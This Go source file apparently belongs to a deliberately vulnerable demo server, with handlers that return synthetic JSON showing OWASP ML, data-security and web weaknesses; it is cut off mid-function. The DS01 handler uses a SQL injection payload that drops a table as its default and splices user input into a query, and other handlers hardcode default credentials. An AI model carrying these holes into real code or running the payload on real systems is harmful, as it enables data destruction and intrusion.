			"neural_cleanse":       false,
			"activation_clustering": false,
			"fine_pruning":         false,
			"spectral_signatures":  false,
			"manual_inspection":    "base model accepted without inspection",
		},
		"_comment": "VIOLATION: Backdoored base model in transfer learning pipeline, no backdoor detection performed",
	})
	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, resp)
	return http.StatusOK
}

// ML08: Model Skewing — production drift
func (h *Handler) serveMLModelSkewing(w http.ResponseWriter, r *http.Request) int {
	w.Header().Set("Content-Type", "application/json")
	_ = h.rngFromPath(r.URL.Path) // keep deterministic seed consumption
	ts := time.Now().UTC().Format(time.RFC3339)

	resp := toJSON(map[string]interface{}{
		"model":          "acme-credit-scorer-v7",
		"evaluated_at":   ts,
		"training_period": "2022-01-01 to 2022-12-31",
		"current_date":   "2024-11-15",
		"drift_report": map[string]interface{}{
			"feature_drift": []map[string]interface{}{
				{"feature": "avg_income", "training_mean": 52000, "production_mean": 67500, "drift_pct": 29.8},
				{"feature": "interest_rate", "training_mean": 3.25, "production_mean": 7.50, "drift_pct": 130.8},
				{"feature": "housing_price_index", "training_mean": 310, "production_mean": 425, "drift_pct": 37.1},
			},
			"prediction_drift": map[string]interface{}{
				"training_approval_rate": 0.68,
				"production_approval_rate": 0.41,
				"drift_pct":              -39.7,
			},
			"performance_degradation": map[string]interface{}{
				"training_auc":    0.94,
				"production_auc":  0.71,
				"degradation_pct": -24.5,
			},
		},
		"monitoring": map[string]interface{}{
			"drift_detection":    false,
			"automated_retrain":  false,
			"performance_alerts": false,
			"a_b_testing":        false,
			"shadow_models":      false,
		},
		"_comment": "VIOLATION: Model deployed 2+ years without retraining, significant feature and prediction drift",
	})
	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, resp)
	return http.StatusOK
}

// ML09: Output Integrity — inconsistent results for same input
func (h *Handler) serveMLOutputIntegrity(w http.ResponseWriter, r *http.Request) int {
	w.Header().Set("Content-Type", "application/json")
	rng := h.rngFromPath(r.URL.Path)
	reqID := "oi-" + h.randomHex(rng, 10)
	ts := time.Now().UTC().Format(time.RFC3339)

	resp := toJSON(map[string]interface{}{
		"request_id":     reqID,
		"model":          "acme-risk-assessment-api",
		"input_hash":     h.randomHex(rng, 32),
		"identical_requests": []map[string]interface{}{
			{"timestamp": ts, "server": "ml-node-1", "prediction": "low_risk", "confidence": 0.82, "latency_ms": 45},
			{"timestamp": ts, "server": "ml-node-2", "prediction": "high_risk", "confidence": 0.76, "latency_ms": 52},
			{"timestamp": ts, "server": "ml-node-3", "prediction": "medium_risk", "confidence": 0.61, "latency_ms": 48},
			{"timestamp": ts, "server": "ml-node-1", "prediction": "low_risk", "confidence": 0.79, "latency_ms": 44},
		},
		"root_causes": []string{
			"Different model versions deployed across nodes (v2.1, v2.3, v2.4)",
			"Non-deterministic inference (random dropout not disabled in eval mode)",
			"Floating point inconsistencies across different GPU hardware",
			"No model versioning or deployment consistency checks",
		},
		"integrity_controls": map[string]interface{}{
			"model_versioning":     false,
			"deterministic_mode":   false,
			"output_hashing":       false,
			"consensus_mechanism":  false,
			"canary_testing":       false,
		},
		"_comment": "VIOLATION: Same input produces different outputs across API calls — no output integrity guarantees",
	})
	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, resp)
	return http.StatusOK
}

// ML10: Model Poisoning — federated learning with malicious updates
func (h *Handler) serveMLModelPoisoning(w http.ResponseWriter, r *http.Request) int {
	w.Header().Set("Content-Type", "application/json")
	rng := h.rngFromPath(r.URL.Path)
	roundID := rng.Intn(500) + 100

	clients := make([]map[string]interface{}, 6)
	for i := range clients {
		isMalicious := i == 2 || i == 4
		status := "legitimate"
		gradMagnitude := 0.01 + rng.Float64()*0.05
		if isMalicious {
			status = "malicious"
			gradMagnitude = 2.5 + rng.Float64()*3.0
		}
		clients[i] = map[string]interface{}{
			"client_id":        fmt.Sprintf("fed-client-%s", h.randomHex(rng, 4)),
			"status":           status,
			"gradient_magnitude": fmt.Sprintf("%.4f", gradMagnitude),
			"samples_claimed":  rng.Intn(5000) + 500,
			"update_size_mb":   fmt.Sprintf("%.1f", 1.0+rng.Float64()*4.0),
		}
	}

	resp := toJSON(map[string]interface{}{
		"protocol":       "federated_learning",
		"aggregation":    "FedAvg (no robust aggregation)",
		"round":          roundID,
		"total_clients":  50,
		"participating":  6,
		"client_updates": clients,
		"defenses": map[string]interface{}{
			"byzantine_tolerance":   false,
			"gradient_clipping":     false,
			"anomaly_detection":     false,
			"secure_aggregation":    false,
			"client_authentication": "none — open enrollment",
			"contribution_audit":    false,
		},
		"impact": map[string]interface{}{
			"global_model_accuracy_before": 0.92,
			"global_model_accuracy_after":  0.84,
			"backdoor_success_rate":        0.78,
		},
		"_comment": "VIOLATION: Federated learning with no Byzantine fault tolerance — malicious clients poison global model",
	})
	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, resp)
	return http.StatusOK
}

// ===========================================================================
// OWASP Data Security Top 10 (2025)
// ===========================================================================

func (h *Handler) serveDataSec(w http.ResponseWriter, r *http.Request) int {
	w.Header().Set("X-Glitch-Vuln", "Data-Security-Top-10")
	path := r.URL.Path

	switch {
	case path == "/vuln/data-sec/" || path == "/vuln/data-sec":
		return h.serveDataSecIndex(w, r)
	case path == "/vuln/data-sec/injection-flaws":
		return h.serveDataSecInjection(w, r)
	case path == "/vuln/data-sec/broken-auth":
		return h.serveDataSecBrokenAuth(w, r)
	case path == "/vuln/data-sec/sensitive-exposure":
		return h.serveDataSecSensitiveExposure(w, r)
	case path == "/vuln/data-sec/insufficient-access":
		return h.serveDataSecInsufficientAccess(w, r)
	case path == "/vuln/data-sec/data-integrity":
		return h.serveDataSecDataIntegrity(w, r)
	case path == "/vuln/data-sec/insufficient-audit":
		return h.serveDataSecInsufficientAudit(w, r)
	case path == "/vuln/data-sec/data-masking":
		return h.serveDataSecDataMasking(w, r)
	case path == "/vuln/data-sec/insecure-config":
		return h.serveDataSecInsecureConfig(w, r)
	case path == "/vuln/data-sec/insufficient-lifecycle":
		return h.serveDataSecInsufficientLifecycle(w, r)
	case path == "/vuln/data-sec/vendor-management":
		return h.serveDataSecVendorManagement(w, r)
	default:
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		w.WriteHeader(http.StatusNotFound)
		fmt.Fprint(w, h.wrapHTML("Data Security - Not Found", "<p>Unknown data security demo endpoint.</p>"))
		return http.StatusNotFound
	}
}

func (h *Handler) serveDataSecIndex(w http.ResponseWriter, r *http.Request) int {
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	body := `<h2>OWASP Data Security Top 10 (2025)</h2>
<p>These endpoints demonstrate common data security risks in modern data infrastructure.
All data is synthetic and generated for educational/research purposes.</p>
<h3>Data Security Risks</h3>
<ul>
  <li><a href="/vuln/data-sec/injection-flaws">DS01 - Injection Flaws</a> — SQL injection in data pipeline query</li>
  <li><a href="/vuln/data-sec/broken-auth">DS02 - Broken Authentication</a> — data warehouse with shared admin account</li>
  <li><a href="/vuln/data-sec/sensitive-exposure">DS03 - Sensitive Data Exposure</a> — S3 bucket listing with PII files public</li>
  <li><a href="/vuln/data-sec/insufficient-access">DS04 - Insufficient Access Control</a> — data lake with no row-level security</li>
  <li><a href="/vuln/data-sec/data-integrity">DS05 - Data Integrity Failures</a> — ETL pipeline with no checksum validation</li>
  <li><a href="/vuln/data-sec/insufficient-audit">DS06 - Insufficient Audit Logging</a> — data access with no audit log</li>
  <li><a href="/vuln/data-sec/data-masking">DS07 - Improper Data Masking</a> — test environment with production PII</li>
  <li><a href="/vuln/data-sec/insecure-config">DS08 - Insecure Configuration</a> — database with default port, public endpoint</li>
  <li><a href="/vuln/data-sec/insufficient-lifecycle">DS09 - Insufficient Data Lifecycle</a> — data retention policy: keep forever</li>
  <li><a href="/vuln/data-sec/vendor-management">DS10 - Vendor Management Failures</a> — 12 SaaS integrations with no DPA signed</li>
</ul>`
	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, h.wrapHTML("OWASP Data Security Top 10", body))
	return http.StatusOK
}

// DS01: Injection Flaws in data pipeline
func (h *Handler) serveDataSecInjection(w http.ResponseWriter, r *http.Request) int {
	w.Header().Set("Content-Type", "application/json")
	rng := h.rngFromPath(r.URL.Path)
	jobID := "etl-" + h.randomHex(rng, 8)
	userFilter := r.URL.Query().Get("filter")
	if userFilter == "" {
		userFilter = "1=1; DROP TABLE customer_data; --"
	}

	resp := toJSON(map[string]interface{}{
		"pipeline":   "daily-customer-aggregation",
		"job_id":     jobID,
		"stage":      "extract",
		"query_template": "SELECT * FROM raw_events WHERE event_date = '${date}' AND region = '${filter}'",
		"rendered_query": fmt.Sprintf("SELECT * FROM raw_events WHERE event_date = '2024-11-15' AND region = '%s'", userFilter),
		"source": map[string]interface{}{
			"type":       "snowflake",
			"warehouse":  "ANALYTICS_WH",
			"database":   "PROD_DATA",
			"schema":     "PUBLIC",
			"role":       "ACCOUNTADMIN",
			"connection": "snowflake://acme_admin:SnowPr0d!@acme.snowflakecomputing.com",
		},
		"input_sanitization": false,
		"parameterized_query": false,
		"_comment":           "VIOLATION: User-supplied filter interpolated directly into data pipeline SQL query",
	})
	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, resp)
	return http.StatusOK
}

// DS02: Broken Authentication — shared admin account
func (h *Handler) serveDataSecBrokenAuth(w http.ResponseWriter, r *http.Request) int {
	w.Header().Set("Content-Type", "application/json")
	rng := h.rngFromPath(r.URL.Path)
	ts := time.Now().UTC().Format(time.RFC3339)

	users := make([]map[string]interface{}, 5)
	for i := range users {
		fn := h.firstNames[rng.Intn(len(h.firstNames))]
		users[i] = map[string]interface{}{
			"user":       fn,
			"login_as":   "dw_admin",
			"last_login": ts,
			"ip":         fmt.Sprintf("10.%d.%d.%d", rng.Intn(256), rng.Intn(256), rng.Intn(256)),
		}
	}

	resp := toJSON(map[string]interface{}{
		"warehouse":  "acme-data-warehouse",
		"platform":   "BigQuery",
		"shared_account": map[string]interface{}{
			"username":           "dw_admin",
			"password":           "DataWarehouse2023!",
			"last_rotated":       "2022-01-15",
			"mfa_enabled":        false,
			"shared_among":       12,
			"role":               "OWNER",
			"permissions":        []string{"ALL_TABLES", "ALL_SCHEMAS", "ADMIN", "CREATE_USER", "DROP_DATABASE"},
		},
		"recent_logins":  users,
		"audit_trail":    "disabled — all actions attributed to dw_admin",
		"individual_accounts": false,
		"_comment":       "VIOLATION: Single shared admin account for data warehouse, no individual accountability",
	})
	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, resp)
	return http.StatusOK
}

// DS03: Sensitive Data Exposure — public S3 bucket
func (h *Handler) serveDataSecSensitiveExposure(w http.ResponseWriter, r *http.Request) int {
	w.Header().Set("Content-Type", "application/json")
	rng := h.rngFromPath(r.URL.Path)
	bucketName := "acme-data-exports-" + h.randomHex(rng, 4)

	resp := toJSON(map[string]interface{}{
		"bucket":     bucketName,
		"region":     "us-east-1",
		"acl":        "public-read",
		"versioning": false,
		"encryption": "none",
		"objects": []map[string]interface{}{
			{"key": "exports/customers_full_2024.csv", "size_mb": 847, "contains": "name, email, SSN, DOB, address", "last_modified": "2024-11-01"},
			{"key": "exports/payment_cards_2024.csv", "size_mb": 312, "contains": "cardholder, card_number, expiry, cvv", "last_modified": "2024-10-15"},
			{"key": "backups/users_db_dump.sql.gz", "size_mb": 2400, "contains": "complete users table with passwords", "last_modified": "2024-11-10"},
			{"key": "ml-training/labeled_health_records.parquet", "size_mb": 5600, "contains": "patient records with diagnoses", "last_modified": "2024-09-22"},
			{"key": "reports/employee_salaries_2024.xlsx", "size_mb": 15, "contains": "all employee compensation data", "last_modified": "2024-11-12"},
		},
		"public_url": fmt.Sprintf("https://%s.s3.amazonaws.com/", bucketName),
		"indexed_by_search_engines": true,
		"access_logging":            false,
		"_comment":                  "VIOLATION: S3 bucket with PII, payment data, and health records publicly readable",
	})
	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, resp)
	return http.StatusOK
}

// DS04: Insufficient Access Control — no row-level security
func (h *Handler) serveDataSecInsufficientAccess(w http.ResponseWriter, r *http.Request) int {
	w.Header().Set("Content-Type", "application/json")
	rng := h.rngFromPath(r.URL.Path)

	resp := toJSON(map[string]interface{}{
		"platform":    "acme-data-lake",
		"storage":     "Delta Lake on S3",
		"access_model": map[string]interface{}{
			"row_level_security":    false,
			"column_level_security": false,
			"data_masking":          false,
			"attribute_based_access": false,
		},
		"tables": []map[string]interface{}{
			{"name": "customer_360", "rows": rng.Intn(5000000) + 1000000, "sensitive_columns": []string{"ssn", "dob", "income", "credit_score"}, "access": "all_analysts"},
			{"name": "employee_data", "rows": rng.Intn(50000) + 5000, "sensitive_columns": []string{"salary", "performance_rating", "disciplinary_record"}, "access": "all_analysts"},
			{"name": "health_claims", "rows": rng.Intn(1000000) + 100000, "sensitive_columns": []string{"diagnosis", "medications", "provider_notes"}, "access": "all_analysts"},
		},
		"query_example": map[string]interface{}{
			"user":  "junior_analyst_intern",
			"query": "SELECT ssn, income, credit_score FROM customer_360 LIMIT 1000000",
			"result": "allowed — no access restrictions",
		},
		"_comment": "VIOLATION: Any analyst can query all sensitive data with no row or column-level restrictions",
	})
	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, resp)
	return http.StatusOK
}

// DS05: Data Integrity Failures — ETL with no checksums
func (h *Handler) serveDataSecDataIntegrity(w http.ResponseWriter, r *http.Request) int {
	w.Header().Set("Content-Type", "application/json")
	rng := h.rngFromPath(r.URL.Path)
	pipelineID := "pipe-" + h.randomHex(rng, 6)

	resp := toJSON(map[string]interface{}{
		"pipeline_id":   pipelineID,
		"pipeline_name": "daily-revenue-aggregation",
		"stages": []map[string]interface{}{
			{"stage": "extract", "source": "postgres://prod-db:5432/orders", "checksum": "none", "row_count_validated": false},
			{"stage": "transform", "operations": []string{"currency_conversion", "dedup", "join_customer"}, "checksum": "none", "schema_validated": false},
			{"stage": "load", "destination": "snowflake://analytics/revenue", "checksum": "none", "row_count_validated": false},
		},
		"integrity_controls": map[string]interface{}{
			"source_checksums":       false,
			"row_count_reconciliation": false,
			"schema_validation":      false,
			"data_quality_checks":    false,
			"idempotency_keys":       false,
			"exactly_once_delivery":  false,
			"dead_letter_queue":      false,
		},
		"recent_incidents": []map[string]interface{}{
			{"date": "2024-10-28", "issue": "15,000 duplicate rows loaded — no dedup check at load stage"},
			{"date": "2024-11-02", "issue": "Currency conversion used stale rates — no freshness validation"},
			{"date": "2024-11-10", "issue": "Source schema changed — pipeline silently dropped 3 columns"},
		},
		"_comment": "VIOLATION: ETL pipeline with no checksum validation, no row counts, no schema checks",
	})
	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, resp)
	return http.StatusOK
}

// DS06: Insufficient Audit Logging — no data access audit
func (h *Handler) serveDataSecInsufficientAudit(w http.ResponseWriter, r *http.Request) int {
	w.Header().Set("Content-Type", "application/json")

	resp := toJSON(map[string]interface{}{
		"platform":     "acme-analytics-platform",
		"audit_config": map[string]interface{}{
			"query_logging":      false,
			"data_access_log":    false,
			"export_tracking":    false,
			"schema_change_log":  false,
			"permission_changes": false,
			"login_attempts":     false,
		},
		"compliance_gaps": []string{
			"GDPR Art. 30 — No records of processing activities",
			"SOC2 CC7.2 — No monitoring of data access",
			"HIPAA 164.312(b) — No audit controls for ePHI access",
			"PCI DSS 10.2 — No audit trail for cardholder data access",
		},
		"untracked_events_last_30d": map[string]interface{}{
			"queries_executed":      847293,
			"data_exports":          1247,
			"bulk_downloads":        89,
			"schema_modifications":  34,
			"permission_changes":    156,
			"events_logged":         0,
		},
		"_comment": "VIOLATION: No audit logging for data access — impossible to detect breaches or prove compliance",
	})
	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, resp)
	return http.StatusOK
}

// DS07: Improper Data Masking — production PII in test
func (h *Handler) serveDataSecDataMasking(w http.ResponseWriter, r *http.Request) int {
	w.Header().Set("Content-Type", "application/json")
	rng := h.rngFromPath(r.URL.Path)

	records := make([]map[string]interface{}, 4)
	for i := range records {
		fn := h.firstNames[rng.Intn(len(h.firstNames))]
		ln := h.lastNames[rng.Intn(len(h.lastNames))]
		records[i] = map[string]interface{}{
			"id":    rng.Intn(90000) + 10000,
			"name":  fmt.Sprintf("%s %s", fn, ln),
			"email": fmt.Sprintf("%s.%s@%s", fn, ln, h.domains[rng.Intn(len(h.domains))]),
			"ssn":   fmt.Sprintf("%03d-%02d-%04d", rng.Intn(900)+100, rng.Intn(90)+10, rng.Intn(9000)+1000),
			"phone": fmt.Sprintf("(%03d) %03d-%04d", rng.Intn(900)+100, rng.Intn(900)+100, rng.Intn(9000)+1000),
			"dob":   fmt.Sprintf("%d-%02d-%02d", rng.Intn(40)+1960, rng.Intn(12)+1, rng.Intn(28)+1),
		}
	}

	resp := toJSON(map[string]interface{}{
		"environment": "staging",
		"database":    "acme_staging_db",
		"source":      "production database (direct copy)",
		"masking_applied": false,
		"records":     records,
		"data_masking_config": map[string]interface{}{
			"enabled":          false,
			"tool":             "none",
			"masking_rules":    []string{},
			"tokenization":     false,
			"synthetic_data":   false,
			"refresh_schedule": "weekly full copy from production",
		},
		"access_controls": map[string]interface{}{
			"developers_with_access": 47,
			"contractors_with_access": 12,
			"nda_required":            false,
			"background_check":        false,
		},
		"_comment": "VIOLATION: Production PII directly copied to staging — 59 people have unrestricted access",
	})
	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, resp)
	return http.StatusOK
}

// DS08: Insecure Configuration — default ports, public endpoint
func (h *Handler) serveDataSecInsecureConfig(w http.ResponseWriter, r *http.Request) int {
	w.Header().Set("Content-Type", "application/json")
	rng := h.rngFromPath(r.URL.Path)
	publicIP := fmt.Sprintf("%d.%d.%d.%d", rng.Intn(200)+20, rng.Intn(256), rng.Intn(256), rng.Intn(256))

	resp := toJSON(map[string]interface{}{
		"database":  "PostgreSQL 14.2",
		"host":      publicIP,
		"port":      5432,
		"configuration": map[string]interface{}{
			"listen_addresses":   "0.0.0.0",
			"ssl":                "off",
			"password_encryption": "md5",
			"log_connections":     false,
			"log_disconnections":  false,
			"max_connections":     1000,
		},
		"pg_hba_conf": []map[string]interface{}{
			{"type": "host", "database": "all", "user": "all", "address": "0.0.0.0/0", "method": "md5"},
		},
		"default_accounts": []map[string]interface{}{
			{"user": "postgres", "password": "postgres", "active": true},
			{"user": "admin", "password": "admin123", "active": true},
			{"user": "replication", "password": "repl_pass", "active": true},
		},
		"network": map[string]interface{}{
			"firewall":    "none — all ports open",
			"vpc":         "default VPC",
			"subnet":      "public",
			"security_group": "sg-default (allow all inbound)",
		},
		"_comment": "VIOLATION: Database on default port, public IP, SSL off, default credentials, no firewall",
	})
	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, resp)
	return http.StatusOK
}

// DS09: Insufficient Data Lifecycle — keep forever policy
func (h *Handler) serveDataSecInsufficientLifecycle(w http.ResponseWriter, r *http.Request) int {
	w.Header().Set("Content-Type", "application/json")

	resp := toJSON(map[string]interface{}{
		"organization": "Acme Corp",
		"data_retention_policy": map[string]interface{}{
			"policy_document":    "does_not_exist",
			"default_retention":  "indefinite",
			"review_schedule":    "never",
			"last_reviewed":      "never",
		},
		"data_stores": []map[string]interface{}{
			{"store": "customer_database", "oldest_record": "2008-03-15", "retention": "forever", "size_tb": 12.4, "contains_pii": true},
			{"store": "application_logs", "oldest_record": "2015-01-01", "retention": "forever", "size_tb": 48.7, "contains_pii": true},
			{"store": "email_archives", "oldest_record": "2010-06-22", "retention": "forever", "size_tb": 8.9, "contains_pii": true},
			{"store": "analytics_events", "oldest_record": "2017-09-01", "retention": "forever", "size_tb": 156.2, "contains_pii": true},
			{"store": "deleted_user_data", "oldest_record": "2012-11-30", "retention": "forever", "size_tb": 3.1, "contains_pii": true, "note": "deletion requests honored in app but data preserved in backups"},
		},
		"gdpr_compliance": map[string]interface{}{
			"right_to_erasure":   "not_implemented",
			"data_minimization":  "not_practiced",
			"purpose_limitation": "not_enforced",
			"storage_limitation": "not_applied",
		},
		"total_storage_cost_monthly": "$14,230",
		"_comment":                   "VIOLATION: No data lifecycle management — all data kept forever including deleted user data",
	})
	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, resp)
	return http.StatusOK
}

// DS10: Vendor Management — no DPA signed
func (h *Handler) serveDataSecVendorManagement(w http.ResponseWriter, r *http.Request) int {
	w.Header().Set("Content-Type", "application/json")
	rng := h.rngFromPath(r.URL.Path)

	vendors := []map[string]interface{}{
		{"name": "CloudMetrics Pro", "data_shared": []string{"user_behavior", "ip_addresses", "device_ids"}, "dpa_signed": false, "security_review": "never", "data_location": "unknown"},
		{"name": "SendGrid Mailer", "data_shared": []string{"email_addresses", "names", "preferences"}, "dpa_signed": false, "security_review": "never", "data_location": "US"},
		{"name": "AnalyticsPanda", "data_shared": []string{"full_clickstream", "user_ids", "session_data"}, "dpa_signed": false, "security_review": "never", "data_location": "unknown"},
		{"name": "ChatBot.io", "data_shared": []string{"conversation_logs", "user_queries", "pii_in_messages"}, "dpa_signed": false, "security_review": "never", "data_location": "EU"},
		{"name": "PayQuick Gateway", "data_shared": []string{"card_numbers", "billing_addresses", "transaction_amounts"}, "dpa_signed": false, "security_review": "never", "data_location": "unknown"},
		{"name": "HR-SaaS Plus", "data_shared": []string{"employee_ssn", "salaries", "performance_reviews"}, "dpa_signed": false, "security_review": "never", "data_location": "unknown"},
		{"name": "MarketReach CRM", "data_shared": []string{"customer_profiles", "purchase_history", "contact_info"}, "dpa_signed": false, "security_review": "never", "data_location": "unknown"},
		{"name": "LogStash Cloud", "data_shared": []string{"application_logs", "error_traces", "user_actions"}, "dpa_signed": false, "security_review": "never", "data_location": "unknown"},
		{"name": "DocuSign Clone", "data_shared": []string{"contracts", "signatures", "legal_documents"}, "dpa_signed": false, "security_review": "never", "data_location": "unknown"},
		{"name": "BackupVault SaaS", "data_shared": []string{"full_database_dumps", "file_system_snapshots"}, "dpa_signed": false, "security_review": "never", "data_location": "unknown"},
		{"name": "A/B TestKit", "data_shared": []string{"user_segments", "feature_flags", "conversion_data"}, "dpa_signed": false, "security_review": "never", "data_location": "unknown"},
		{"name": "ErrorTracker Pro", "data_shared": []string{"stack_traces", "request_bodies", "user_context"}, "dpa_signed": false, "security_review": "never", "data_location": "unknown"},
	}
	_ = rng // seed used implicitly via path

	resp := toJSON(map[string]interface{}{
		"total_saas_integrations": 12,
		"dpa_signed_count":        0,
		"security_reviews_done":   0,
		"vendor_risk_assessments": 0,
		"vendors":                 vendors,
		"governance": map[string]interface{}{
			"vendor_policy":         "does_not_exist",
			"procurement_review":    false,
			"security_questionnaire": false,
			"annual_review":         false,
			"data_flow_mapping":     false,
			"sub_processor_tracking": false,
		},
		"_comment": "VIOLATION: 12 SaaS vendors processing sensitive data with no DPA, no security review, no risk assessment",
	})
	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, resp)
	return http.StatusOK
}

// ===========================================================================
// OWASP Web Top 10 (2025 Update)
// ===========================================================================

func (h *Handler) serveWeb25(w http.ResponseWriter, r *http.Request) int {
	w.Header().Set("X-Glitch-Vuln", "Web-Top-10-2025")
	path := r.URL.Path

	switch {
	case path == "/vuln/web25/" || path == "/vuln/web25":
		return h.serveWeb25Index(w, r)
	case path == "/vuln/web25/broken-access":
		return h.serveWeb25BrokenAccess(w, r)
	case path == "/vuln/web25/crypto-failures":
		return h.serveWeb25CryptoFailures(w, r)
	case path == "/vuln/web25/injection":
		return h.serveWeb25Injection(w, r)
	case path == "/vuln/web25/insecure-design":
		return h.serveWeb25InsecureDesign(w, r)
	case path == "/vuln/web25/misconfig":
		return h.serveWeb25Misconfig(w, r)
	case path == "/vuln/web25/vuln-components":
		return h.serveWeb25VulnComponents(w, r)
	case path == "/vuln/web25/auth-failures":
		return h.serveWeb25AuthFailures(w, r)
	case path == "/vuln/web25/data-integrity":
		return h.serveWeb25DataIntegrity(w, r)
	case path == "/vuln/web25/logging-failure":
		return h.serveWeb25LoggingFailure(w, r)
	case path == "/vuln/web25/ssrf":
		return h.serveWeb25SSRF(w, r)
	default:
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		w.WriteHeader(http.StatusNotFound)
		fmt.Fprint(w, h.wrapHTML("Web 2025 - Not Found", "<p>Unknown Web 2025 demo endpoint.</p>"))
		return http.StatusNotFound
	}
}

func (h *Handler) serveWeb25Index(w http.ResponseWriter, r *http.Request) int {
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	body := `<h2>OWASP Web Top 10 (2025 Update)</h2>
<p>These endpoints demonstrate the updated OWASP Web Top 10 categories with new/changed
attack vectors. All data is synthetic and for educational/research purposes.</p>
<h3>Updated Web Vulnerabilities</h3>
<ul>
  <li><a href="/vuln/web25/broken-access">W01 - Broken Access Control</a> — BOLA via tenant ID manipulation</li>
  <li><a href="/vuln/web25/crypto-failures">W02 - Cryptographic Failures</a> — TLS 1.0, SHA1 certificates</li>
  <li><a href="/vuln/web25/injection">W03 - Injection</a> — NoSQL injection via MongoDB $gt operator</li>
  <li><a href="/vuln/web25/insecure-design">W04 - Insecure Design</a> — business logic flaw in refund process</li>
  <li><a href="/vuln/web25/misconfig">W05 - Security Misconfiguration</a> — CORS wildcard with credentials</li>
  <li><a href="/vuln/web25/vuln-components">W06 - Vulnerable Components</a> — log4j 2.14.1, Spring4Shell in deps</li>
  <li><a href="/vuln/web25/auth-failures">W07 - Auth Failures</a> — JWT with 30-day expiry, no refresh rotation</li>
  <li><a href="/vuln/web25/data-integrity">W08 - Data Integrity Failures</a> — CI pipeline with no signed commits</li>
  <li><a href="/vuln/web25/logging-failure">W09 - Logging &amp; Monitoring Failure</a> — WAF with no alerting</li>
  <li><a href="/vuln/web25/ssrf">W10 - SSRF</a> — PDF generator fetching user-controlled URLs</li>
</ul>`
	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, h.wrapHTML("OWASP Web Top 10 (2025)", body))
	return http.StatusOK
}

// W01: Broken Access Control — BOLA via tenant ID manipulation
func (h *Handler) serveWeb25BrokenAccess(w http.ResponseWriter, r *http.Request) int {
	w.Header().Set("Content-Type", "application/json")
	rng := h.rngFromPath(r.URL.Path)
	tenantID := r.URL.Query().Get("tenant_id")
	if tenantID == "" {
		tenantID = "tenant-" + h.randomHex(rng, 4)
	}

	fn := h.firstNames[rng.Intn(len(h.firstNames))]
	ln := h.lastNames[rng.Intn(len(h.lastNames))]

	resp := toJSON(map[string]interface{}{
		"endpoint": "/api/v2/tenants/" + tenantID + "/billing",
		"method":   "GET",
		"auth": map[string]interface{}{
			"token_tenant":     "tenant-abc123",
			"requested_tenant": tenantID,
			"authorization_check": "none — only validates token existence, not tenant ownership",
		},
		"response": map[string]interface{}{
			"tenant_id":     tenantID,
			"company_name":  fmt.Sprintf("%s %s Industries", fn, ln),
			"billing_email": fmt.Sprintf("billing@%s", h.domains[rng.Intn(len(h.domains))]),
			"plan":          "enterprise",
			"monthly_spend": fmt.Sprintf("$%d,%03d.00", rng.Intn(90)+10, rng.Intn(1000)),
			"payment_method": map[string]interface{}{
				"type":      "credit_card",
				"last_four": fmt.Sprintf("%04d", rng.Intn(10000)),
				"expiry":    fmt.Sprintf("%02d/%d", rng.Intn(12)+1, rng.Intn(5)+2025),
			},
			"invoices": []map[string]interface{}{
				{"id": "INV-" + h.randomHex(rng, 6), "amount": fmt.Sprintf("$%d.00", rng.Intn(50000)+1000), "status": "paid"},
			},
		},
		"_comment": "VIOLATION: BOLA — any authenticated user can access any tenant's billing by changing the tenant_id",
	})
	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, resp)
	return http.StatusOK
}

// W02: Cryptographic Failures — TLS 1.0, SHA1 certs
func (h *Handler) serveWeb25CryptoFailures(w http.ResponseWriter, r *http.Request) int {
	w.Header().Set("Content-Type", "application/json")
	rng := h.rngFromPath(r.URL.Path)
	serial := h.randomHex(rng, 16)

	resp := toJSON(map[string]interface{}{
		"domain": "portal.acme-corp.com",
		"tls_configuration": map[string]interface{}{
			"min_version":         "TLS 1.0",
			"max_version":         "TLS 1.2",
			"preferred_ciphers":   []string{"TLS_RSA_WITH_RC4_128_SHA", "TLS_RSA_WITH_3DES_EDE_CBC_SHA", "TLS_RSA_WITH_AES_128_CBC_SHA"},
			"supports_tls13":      false,
			"forward_secrecy":     false,
			"hsts_enabled":        false,
		},
		"certificate": map[string]interface{}{
			"issuer":            "Acme Internal CA",
			"serial":            serial,
			"signature_algo":    "SHA1WithRSA",
			"key_size":          1024,
			"valid_from":        "2020-01-15",
			"valid_to":          "2030-01-15",
			"san":               []string{"*.acme-corp.com"},
			"ocsp_stapling":     false,
			"ct_logged":         false,
			"self_signed_chain": true,
		},
		"known_vulnerabilities": []string{
			"BEAST (TLS 1.0 CBC)",
			"POODLE (SSLv3 fallback possible)",
			"Sweet32 (3DES cipher)",
			"RC4 bias attacks",
			"SHA1 collision attacks on certificate",
			"1024-bit RSA key factoring feasible",
		},
		"_comment": "VIOLATION: TLS 1.0, weak ciphers, SHA1 certificate, 1024-bit key, no HSTS",
	})
	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, resp)
	return http.StatusOK
}

// W03: Injection — NoSQL injection via MongoDB $gt
func (h *Handler) serveWeb25Injection(w http.ResponseWriter, r *http.Request) int {
	w.Header().Set("Content-Type", "application/json")
	rng := h.rngFromPath(r.URL.Path)

	users := make([]map[string]interface{}, 3)
	for i := range users {
		fn := h.firstNames[rng.Intn(len(h.firstNames))]
		ln := h.lastNames[rng.Intn(len(h.lastNames))]
		users[i] = map[string]interface{}{
			"_id":      h.randomHex(rng, 12),
			"username": fn + "." + ln,
			"email":    fn + "@" + h.domains[rng.Intn(len(h.domains))],
			"role":     "admin",
			"password": h.randomHex(rng, 32),
		}
	}

	resp := toJSON(map[string]interface{}{
		"endpoint":   "/api/auth/login",
